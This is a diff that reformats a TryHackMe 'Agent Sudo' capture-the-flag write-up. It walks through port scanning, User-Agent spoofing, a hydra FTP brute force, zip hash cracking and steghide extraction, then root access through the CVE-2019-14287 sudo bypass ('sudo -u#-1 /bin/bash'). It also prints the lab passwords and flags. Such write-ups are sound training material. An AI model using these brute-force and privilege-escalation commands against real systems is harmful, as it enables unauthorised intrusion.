@@ -1,95 +1,139 @@
-TryHackMe: Agent Sudo Write-up
-1. Details of the Event
-• Room: Agent Sudo
+🛡️ TryHackMe – Agent Sudo
+---
 
-• Difficulty: Easy
+📌 Overview
+Room Name: Agent Sudo
 
-• Objective: Infiltrate the deep-sea server and reveal the truth.
+Platform: TryHackMe
+
+Difficulty: Easy
+
+Category: Web / Steganography / Privilege Escalation
+
+This challenge involves a series of steps starting from Web enumeration (User-Agent manipulation), hash cracking, multi-layered steganography analysis, and exploiting a known Sudo vulnerability (CVE-2019-14287) to achieve root access.
 
 ---
 
-2. Vulnerability Discovery
-I performed an initial port scan to identify the attack surface: `rustscan -a <IP_ADDRESS>`
+🔍 1. Enumeration Phase
+🔎 Service Scanning
 
-Open Ports:
+The initial reconnaissance was performed using `rustscan` to identify open ports on the target machine.
 
-• `21/tcp` (FTP): `vsftpd 3.0.3`
+```
 
-• `22/tcp` (SSH): `OpenSSH 7.6p1`
+rustscan -a <TARGET_IP>
 
-• `80/tcp` (HTTP): `Apache httpd 2.4.29`
+```
 
-Web Hint: Port 80 displayed a message from Agent R: "Use your own codename as user-agent to access the site."
+Results:
+
+• `21/tcp`: FTP (vsftpd 3.0.3)
+
+• `22/tcp`: SSH (OpenSSH 7.6p1)
+
+• `80/tcp`: HTTP (Apache 2.4.29)
+
+🌐 Web Directory Discovery
+
+The root page on port 80 instructed: "Use your own codename as user-agent to access the site". By testing codenames via `Burp Suite`, I identified Agent `C` as the correct User-Agent. This redirected to `agent_C_attention.php`, revealing the username `chris` and a hint about a weak password.
 
 ---
 
-3. Exploitation
-Step 1: User-Agent Bypass
+🔓 2. Initial Access
+🔑 FTP Brute Force
 
-I intercepted the HTTP request and modified the `User-Agent` header.
+Using `hydra` to attack the FTP service with the username `chris`:
 
-• Codename: `C`
+```
 
-• Result: Redirected to `agent_C_attention.php`.
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
 
-• Discovery: Agent C is `chris` and has a "weak password."
+```
 
-Step 2: FTP Brute Force
+• Result: `crystal`
 
-Used `hydra` to crack Chris's FTP access: `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<IP_ADDRESS>`
+📦 Steganography Analysis
 
-• Password Found: `crystal`
+I retrieved three files from the FTP server: `To_agentJ.txt`, `cutie.png`, and `cute-alien.jpg`.
 
-Step 3: Steganography (Layer 1)
+Layer 1: PNG Analysis (`cutie.png`) `binwalk` revealed a hidden Zip archive. I cracked its password using `johntheripper`:
 
-Downloaded 3 files from FTP: `To_agentJ.txt`, `cutie.png`, and `cute-alien.jpg`. Analyzing `cutie.png` with `binwalk`: `binwalk -e cutie.png`
+```
 
-• Discovery: A hidden Zip archive containing `To_agentR.txt`.
+binwalk -e cutie.png
 
-• Cracking Zip:
+zip2john 8702.zip > hash.txt
 
-  1. `zip2john 8702.zip > hash.txt`
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
-  2. `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+```
 
 • Zip Password: `alien`
 
-Step 4: Steganography (Layer 2)
+• Finding: `To_agentR.txt` contained a Base64 string `QXJlYTUx` -> `Area51`.
 
-Inside the Zip, a message contained the Base64 string `QXJlYTUx`. `echo 'QXJlYTUx' | base64 -d` -> `Area51`
+Layer 2: JPEG Analysis (`cute-alien.jpg`) Using `Area51` as the passphrase for `steghide`:
 
-Used `Area51` as the passphrase for `cute-alien.jpg`: `steghide extract -sf cute-alien.jpg`
+```
 
-• Discovery: `message.txt` revealed SSH credentials for `james`.
+steghide extract -sf cute-alien.jpg
 
-• SSH Password: `hackerrules!`
+```
 
----
-
-4. Privilege Escalation
-User Flag
-
-`ssh james@<IP_ADDRESS>`
-
-• Flag: `b03d975e8c92a7c04146cfa7a5a313c7`
-
-Root Flag (CVE-2019-14287)
-
-Checking permissions: `sudo -l`
-
-• Output: `(ALL, !root) /bin/bash`
-
-• Version: `sudo -V` -> `1.8.21p2`
-
-This version allows a Security Bypass. By requesting UID `-1`, the system fails to block `root` access. The Exploit: `sudo -u#-1 /bin/bash`
-
-• Root Flag: `b53a02f55b57d4439e3341834d70c062`
+• Result: `message.txt` revealed SSH credentials for user `james`: `hackerrules!`.
 
 ---
 
-5. Takeaways
-• Enumeration is Key: The User-Agent hint was the only way into the web app.
+🚀 3. Privilege Escalation
+🔍 Identifying the Vector
 
-• Stego Chains: Files can be hidden inside files (Image > Zip > Text). Tools like `binwalk` and `steghide` are mandatory.
+After logging in as `james` via SSH, I checked the sudo permissions:
 
-• Configuration Logic: `(ALL, !root)` is a dangerous configuration on older `sudo` versions. Always check `sudo -V`.
+```
+
+sudo -l
+
+# (ALL, !root) /bin/bash
+
+```
+
+The version was `Sudo 1.8.21p2`. This configuration is vulnerable to CVE-2019-14287, which allows a security bypass by specifying the UID as `-1`.
+
+🔓 Gaining Root Shell
+
+Exploiting the logic flaw to bypass the `!root` restriction and spawn a root shell:
+
+```
+
+sudo -u#-1 /bin/bash
+
+```
+
+Status: Root access obtained.
+
+Root Flag:
+
+```
+
+b53a02f55b57d4439e3341834d70c062
+
+```
+
+---
+
+🏁 4. Conclusion & Key Takeaways
+🔐 Security Lessons
+
+• Headers are not Security: Never trust `User-Agent` headers for authentication; they are easily spoofed.
+
+• Deep Steganography: CTFs often hide data in nested layers (Image > Zip > Text). Always check for appended data and use specialized tools.
+
+• Sudo Configuration Risk: The `(ALL, !root)` configuration is dangerous on older Sudo versions. Always keep core binaries updated to the latest version.
+
+• Credential Hygiene: Avoid weak passwords (e.g., `crystal`) and never store sensitive credentials in cleartext files like `message.txt`.
+
+---
+
+✍️ Author: Akira Hasuo
+
+📘 Created for educational and portfolio purposes only
